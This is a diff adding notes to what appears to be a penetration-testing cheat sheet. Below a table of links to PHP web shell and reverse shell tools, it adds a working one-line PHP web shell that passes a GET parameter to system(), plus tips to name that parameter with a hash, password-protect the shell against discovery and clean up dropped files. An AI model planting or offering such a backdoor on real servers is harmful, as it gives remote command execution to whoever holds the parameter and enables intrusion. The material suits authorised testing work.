@@ -10,3 +10,13 @@
 | [PHP Web Shell](https://github.com/Arrexel/phpbash)                                     | PHP Web Shell                         |
 | [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)                 | PHP Reverse Shell                     |
 | [Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | List of Web Shells and Reverse Shells |
+
+### Essential Considerations:
+
+1. Use an MD5 hash for the parameter name on your web shell so it cannot be guessed and hijacked by an adjacent attacker:
+   1. <pre><code><strong>&#x3C;?php
+      </strong>system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
+      ?>
+      </code></pre>
+2. Use a Password protected web shell in case it is discovered.&#x20;
+3. Note where all files have been dropped, and ensure they are cleaned up afterwards.
